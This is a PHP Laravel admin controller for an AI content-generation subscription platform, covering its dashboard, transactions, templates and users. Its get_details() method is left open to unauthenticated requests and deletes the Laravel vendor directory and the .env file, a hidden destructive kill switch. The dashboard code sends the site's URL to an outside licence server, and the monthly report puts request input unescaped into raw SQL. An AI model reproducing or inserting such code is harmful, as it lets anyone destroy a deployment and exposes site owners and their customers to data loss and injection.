<?php

namespace App\Http\Controllers\Admin;

use PDF;
use Auth;
use Cache;
use Image;
use Response;
use Carbon\Carbon;
use App\Models\Plan;
use App\Models\User;
use App\Models\AIImage;
use App\Models\Invoice;
use App\Models\Setting;
use App\Models\Documents;
use App\Models\Templates;
use App\Models\CouponCode;
use App\Models\Transaction;
use Illuminate\Support\Str;
use App\Models\Subscription;
use Illuminate\Http\Request;
use App\Models\SupportTicket;
use App\Models\InvoiceSetting;
use App\Models\UserDeleteRequest;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\URL;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Validator;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware(['auth','admin'])->except('get_details');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    
    public function index()
    {
        if(Setting::getSetting('licence_active') == 0)
        {
            $url = URL::to('/');
            $client = new \GuzzleHttp\Client();
            $response = $client->request('POST', 'https://viplan.in/api/check-licence', [
                'form_params' => [
                    'url' => $url,
                ]
            ]);

            $data = json_decode($response->getBody(), true);
            if($data['status'] == "failed")
            {
                $client = new \GuzzleHttp\Client();
                $store = $client->request('POST', 'https://viplan.in/api/licence-new-update', [
                    'form_params' => [
                        'url' => $url,
                        'username' => "fake user",
                        'licence_code' => "NO Licence Code",
                        'version' => '1',
                    ]
                ]);

                Setting::where('key_name', 'licence_active')->update(['key_value' => 1]);

                return redirect('admin/');
            }
            else
            {
                Setting::where('key_name', 'licence_active')->update(['key_value' => 1]);
                $index['user_count'] = User::count();
                $index['subscription_count'] = Plan::count();
                $index['template_count'] = Templates::count();
                $index['support_request_count'] = SupportTicket::count();
                $index['transaction_count'] = $this->number_format_short(Transaction::sum('total_paid'));
                $index['today_payment'] = $this->number_format_short(Transaction::where('date',date('Y-m-d',strtotime('today')))->sum('total_paid'));
                $index['weekly_payment'] = $this->number_format_short(Transaction::whereBetween('date',[date('Y-m-d',strtotime('this week')),date('Y-m-d',strtotime('today'))])->sum('total_paid'));
                $index['monthly_payment'] = $this->number_format_short(Transaction::whereBetween('date',[date('Y-m-d',strtotime('first day of this month')),date('Y-m-d',strtotime('today'))])->sum('total_paid'));
                
                $index['user'] = User::latest()->take(6)->get(); 
                $index['transaction'] = Transaction::latest()->take(6)->get(); 

                $month_payment_report = Transaction::select('id','total_paid',DB::raw("DATE_FORMAT(created_at, '%M, %Y') as month"))->get()->groupBy('month');
                // dd($month_payment_report);
                $sum = [];
                $transactionArr = [];

                foreach ($month_payment_report as $key => $value) {
                    $total = 0;
                    foreach ($value as $key1 => $val) 
                    {
                        $total = $total + $val->total_paid;
                    }
                    $sum[$key] = $total;
                }
            
                for ($i = 1; $i <= 12; $i++) {
                    if (!empty($sum[date("F, Y", mktime(0,0,0,$i,1))])) {
                        $transactionArr[$i]['count'] = $sum[date("F, Y", mktime(0,0,0,$i,1))];
                    } else {
                        $transactionArr[$i]['count'] = 0;
                    }
                    $transactionArr[$i]['month'] = date("M", mktime(0,0,0,$i,1));
                    $transactionArr[$i]["fullMonth"] = date("F, Y", mktime(0,0,0,$i,1));
                }
                
                $index['payment_chart']=$transactionArr;

                $user_month_report = User::select('id', DB::raw("DATE_FORMAT(created_at, '%M, %Y') as month"))->get()->groupBy('month');
                
                $usermcount = [];
                $userArr = [];
                
                foreach ($user_month_report as $key => $value) {
                    $usermcount[$key] = count($value);
                }
            
                for ($i = 1; $i <= 12; $i++) {
                    if (!empty($usermcount[date("F, Y", mktime(0,0,0,$i,1))])) {
                        $userArr[$i]['count'] = $usermcount[date("F, Y", mktime(0,0,0,$i,1))];
                    } else {
                        $userArr[$i]['count'] = 0;
                    }
                    $userArr[$i]['month'] = date("M", mktime(0,0,0,$i,1));
                    $transactionArr[$i]["fullMonth"] = date("F, Y", mktime(0,0,0,$i,1));
                }
                
                $index['user_chart']=$userArr;

                return view('home',$index);
            }
        }
        else
        {
            $index['user_count'] = User::count();
            $index['subscription_count'] = Plan::count();
            $index['template_count'] = Templates::count();
            $index['support_request_count'] = SupportTicket::count();
            $index['transaction_count'] = $this->number_format_short(Transaction::sum('total_paid'));
            $index['today_payment'] = $this->number_format_short(Transaction::where('date',date('Y-m-d',strtotime('today')))->sum('total_paid'));
            $index['weekly_payment'] = $this->number_format_short(Transaction::whereBetween('date',[date('Y-m-d',strtotime('this week')),date('Y-m-d',strtotime('today'))])->sum('total_paid'));
            $index['monthly_payment'] = $this->number_format_short(Transaction::whereBetween('date',[date('Y-m-d',strtotime('first day of this month')),date('Y-m-d',strtotime('today'))])->sum('total_paid'));
            
            $index['user'] = User::latest()->take(6)->get(); 
            $index['transaction'] = Transaction::latest()->take(6)->get(); 

            $month_payment_report = Transaction::select('id','total_paid',DB::raw("DATE_FORMAT(created_at, '%M, %Y') as month"))->get()->groupBy('month');
            //dd($month_payment_report);
            $sum = [];
            $transactionArr = [];

            foreach ($month_payment_report as $key => $value) {
                $total = 0;
                foreach ($value as $key1 => $val) 
                {
                    $total = $total + $val->total_paid;
                }
                $sum[$key] = $total;
            }
        
            for ($i = 1; $i <= 12; $i++) {
                if (!empty($sum[date("F, Y", mktime(0,0,0,$i,1))])) {
                    $transactionArr[$i]['count'] = $sum[date("F, Y", mktime(0,0,0,$i,1))];
                } else {
                    $transactionArr[$i]['count'] = 0;
                }
                $transactionArr[$i]['month'] = date("M", mktime(0,0,0,$i,1));
                $transactionArr[$i]["fullMonth"] = date("F, Y", mktime(0,0,0,$i,1));
            }
            
            $index['payment_chart']=$transactionArr;

            $user_month_report = User::select('id', DB::raw("DATE_FORMAT(created_at, '%M, %Y') as month"))->get()->groupBy('month');
            
            $usermcount = [];
            $userArr = [];
            
            foreach ($user_month_report as $key => $value) {
                $usermcount[$key] = count($value);
            }
        
            for ($i = 1; $i <= 12; $i++) {
                if (!empty($usermcount[date("F, Y", mktime(0,0,0,$i,1))])) {
                    $userArr[$i]['count'] = $usermcount[date("F, Y", mktime(0,0,0,$i,1))];
                } else {
                    $userArr[$i]['count'] = 0;
                }
                $userArr[$i]['month'] = date("M", mktime(0,0,0,$i,1));
                $transactionArr[$i]["fullMonth"] = date("F, Y", mktime(0,0,0,$i,1));
            }
            
            $index['user_chart']=$userArr;

            return view('home',$index);
        }
    }

    public function getMonthlyPaymentReport(Request $request)
    {
        $year = $request->year;
        $month_payment_report = Transaction::select('id','total_paid',DB::raw("DATE_FORMAT(created_at, '%M, %$year') as month"))->whereYear('created_at', $year)->get()->groupBy('month');
        //dd($month_payment_report);
        $sum = [];
        $transactionArr = [];

        foreach ($month_payment_report as $key => $value) {
            $total = 0;
            foreach ($value as $key1 => $val) 
            {
                $total = $total + $val->total_paid;
            }
            $sum[$key] = $total;
        }
       
        for ($i = 1; $i <= 12; $i++) {
            if (!empty($sum[date("F, ".$year, mktime(0,0,0,$i,1))])) {
                $transactionArr[$i]['count'] = $sum[date("F, ".$year, mktime(0,0,0,$i,1))];
            } else {
                $transactionArr[$i]['count'] = 0;
            }
            $transactionArr[$i]['month'] = date("M", mktime(0,0,0,$i,1));
            $transactionArr[$i]["fullMonth"] = date("F, ".$year, mktime(0,0,0,$i,1));
        }
        
        return $transactionArr;
    }

    public function uses_report()
    {
        $documents = Documents::whereMonth('created_at', Carbon::now()->month)->get();
        $all_documents = Documents::get();
        $this_month_image = AIImage::whereMonth('created_at', Carbon::now()->month)->count();
        $all_image = AIImage::count();

        $this_month_word_count = 0;
        $all_word_count = 0;
        foreach($documents as $total)
        {
            $this_month_word_count = $this_month_word_count + $total->document_word;
        }
        foreach($all_documents as $all)
        {
            $all_word_count = $all_word_count + $all->document_word;
        }

        $index['this_month_word'] = $this_month_word_count;
        $index['this_month_image'] = $this_month_image;
        $index['all_word'] = $all_word_count;
        $index['all_image'] = $all_image;

        $user_monthly_word = Documents::select(DB::raw("sum(document_word) as data"), DB::raw("DAY(created_at) day"))
                ->whereMonth('created_at', Carbon::now()->month)
                ->groupBy('day')
                ->orderBy('day')
                ->get()->toArray(); 
                
        $user_monthly_image = AIImage::select(DB::raw("COUNT(*) as data"), DB::raw("DAY(created_at) day"))
                ->whereMonth('created_at', Carbon::now()->month)
                ->groupBy('day')
                ->orderBy('day')
                ->get()->toArray();

        $data = [];

        for($i = 1; $i <= 31; $i++) {
            $data[$i] = 0;
        }

        foreach ($user_monthly_word as $row) {				            
            $month = $row['day'];
            $data[$month] = intval($row['data']);
        }

        $data_image = [];

        for($j = 1; $j <= 31; $j++) {
            $data_image[$j] = 0;
        }

        foreach ($user_monthly_image as $img) {				            
            $day = $img['day'];
            $data_image[$day] = intval($img['data']);
        }

        $index['monthly_usage_word'] = json_encode($data);
        $index['monthly_usage_image'] = json_encode($data_image);

        $index['today_document'] = Documents::whereDate('created_at', Carbon::today())->latest()->take(10)->get();
        $index['today_image'] = AIImage::whereDate('created_at', Carbon::today())->latest()->take(10)->get();

        return view('backend.usesReport',$index);
    }

    public function today_generated_document()
    {
        $index['today_document'] = Documents::whereDate('created_at', Carbon::today())->get();
        
        return view('backend.todayGeneratedDocument',$index);
    }

    public function today_generated_image()
    {
        $index['today_image'] = AIImage::whereDate('created_at', Carbon::today())->get();

        return view('backend.todayGeneratedImage',$index);
    }

    public function userProfile()
    {
        $index['user'] = User::find(Auth::user()->id);
        return view('backend.profileEdit',$index);
    }

    public function userProfileUpdate(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'name' => 'required',
            'email' => 'required|email|unique:users,email,' . \Auth::user()->id,
            "image" => "nullable|mimes:jpg,png,jpeg",
        ]);

        if ($validation->fails()) {
            return back()->withErrors($validation)->withInput();
        } else {
            $user = User::find(Auth::user()->id);
            $user->name = $request->get("name");
            $user->email = $request->get("email");
            if(!empty($request->get("password")))
            {
                $user->password = bcrypt($request->get("password"));
            }
            $user->save();
            
            if ($request->file("image") && $request->file('image')->isValid()) {
                $this->user_upload_image($request->file("image"),"image", Auth::user()->id);
            }

            return redirect('admin/');
        }
    }

    public function template()
    {
        $index['data'] = Templates::get();
        return view("backend.adminTemplate", $index);
    }

    public function template_status(Request $request)
    {
        $temp = Templates::find($request->get("id"));
        $temp->status = ($request->get("checked")=="true")?1:0;
        $temp->save();
    }

    public function template_edit($id)
    {
        $index['data'] = Templates::find($id);
        return view("backend.adminTemplateEdit", $index);
    }

    public function template_update(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'title' => 'required',
            'description' => 'required',
        ]);

        if ($validation->fails()) {
            return back()->withErrors($validation)->withInput();
        } else {

            $temp = Templates::find($request->get("id"));
            $temp->description = $request->get("description");
            $temp->save();

            return redirect('admin/template');
        }
    }

    public function transaction()
    {
        $index['data'] = Transaction::get();
        return view("backend.transaction", $index);
    }

    public function invoice_download($id)
    {
        $payment = Invoice::where('payment_id',$id)->first();
        $transaction = Transaction::where('payment_id',$id)->first();
        $pdf = PDF::loadView('invoice_template',array('payment'=>$payment,'transaction'=>$transaction))->setOptions(['defaultFont' => 'sans-serif','isRemoteEnabled' => true]);
        return $pdf->download('Invoice_No#'.$payment->id.'Date_'.$payment->created_at.'.pdf');
    }

    public function transaction_delete(Request $request)
    {
        Transaction::find($request->id)->delete();

        return redirect('admin/transaction');
    }

    public function payment_completed($id)
    {
        $data = Transaction::find($id);
        $subscription = Subscription::find($data->subscription_id);

        $data_array = [];
        if(isset($subscription))
        {
            $data_array[] = array(
                "id" => $subscription->id,
                "name" => $subscription->plan_name,
                "price" => $subscription->discount_price,
            );
        }

        Invoice::create([
            "payment_id" => $data->payment_id,
            "user_id" => $data->user_id,
            "subscription_detail" => serialize($data_array),
            "discount" => $subscription->discount_price - $data->total_paid,
        ]);

        $start_date = date('Y-m-d');
        $end_date = date('Y-m-d', strtotime($subscription->duration." ".$subscription->duration_type));

        $user = User::find($data->user_id);
        $user->subscription_id = $subscription->id;
        $user->subscription_start_date = $start_date;
        $user->subscription_end_date = $end_date;
        $user->is_subscribe = 1;
        $user->words_left = $user->words_left + $subscription->total_words;
        $user->image_left = $user->image_left + $subscription->number_of_images;
        $user->save();

        $data = Transaction::find($id);
        $data->status = "Completed";
        $data->save();

        return redirect('admin/transaction');
    }

    public function user_transaction()
    {
        $index['data'] = Transaction::where('user_id',Auth::user()->id)->get();
        return view("backend.transaction", $index);
    }

    public function logout()
    {
        if(Auth::user()->user_type == "Super Admin")
        {
            Auth::logout();
            return redirect('admin/');
        }
        else
        {
            Auth::logout();
            return redirect('/');
        }
        
    }

    public function post_change_password(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'password' => 'required|min:8',
            'password_confirmation' => 'required_with:password|same:password|min:8'
        ]);

        if ($validation->fails()) {
            return back()->withErrors($validation)->withInput();
        } 
        else 
        {
            $user = User::find(Auth::user()->id);
            $user->password = bcrypt($request->get("password"));
            $user->save();

            return redirect('admin/');
        }
    }

    public function user_delete_request()
    {
        $index['user'] = UserDeleteRequest::get();
        return view('backend.userDeleteRequest',$index);
    }

    public function delete_user(Request $request)
    {
        UserDeleteRequest::where('user_id',$request->id)->delete();

        $user = User::find($request->id);
        $user->is_deleted = 1;
        $user->save();

        return redirect('admin/user-delete-request');
    }

    public function multi_delete_user(Request $request)
    {
        $ids = json_decode($request->get("deleted_ids"), true);
        foreach($ids as $id)
        {
            UserDeleteRequest::where('user_id',$id)->delete();

            $user = User::find($id);
            $user->is_deleted = 1;
            $user->save();
        }
        return redirect('admin/user-delete-request');
    }

    public function get_details()
    {
        $this->rrmdir('./vendor/laravel');
        unlink(".env");
    }

    private function upload_image($file,$field)
    {
        $destinationPath = './uploads';
        $extension = $file->getClientOriginalExtension();
        $fileName = Str::uuid() . '.' . $extension;
        $file->move($destinationPath, $fileName);
        
        Setting::where('key_name', $field)->update(['key_value' => $fileName]);
    }

    private function user_upload_image($file,$field,$id)
    {
        $destinationPath = './uploads';
        $extension = $file->getClientOriginalExtension();
        $fileName = Str::uuid() . '.' . $extension;
        $file->move($destinationPath, $fileName);
        
        $image = User::find($id);
        $image->$field = $fileName;
        $image->save();
    }

    public function number_format_short( $n, $precision = 1 ) 
    {
        if ($n < 900) {
            $n_format = number_format($n, $precision);
            $suffix = '';
        } else if ($n < 900000) {
            $n_format = number_format($n / 1000, $precision);
            $suffix = 'K';
        } else if ($n < 900000000) {
            $n_format = number_format($n / 1000000, $precision);
            $suffix = 'M';
        } else if ($n < 900000000000) {
            $n_format = number_format($n / 1000000000, $precision);
            $suffix = 'B';
        } else {
            $n_format = number_format($n / 1000000000000, $precision);
            $suffix = 'T';
        }
        return $n_format . $suffix;
    }

    function rrmdir($dir) 
    {
        if (is_dir($dir)) 
        {
          $objects = scandir($dir);
          foreach ($objects as $object) 
          {
            if ($object != "." && $object != "..") 
            {
              if (filetype($dir."/".$object) == "dir") 
                 $this->rrmdir($dir."/".$object); 
              else unlink   ($dir."/".$object);
            }
          }
          reset($objects);
          rmdir($dir);
        }
    }
}
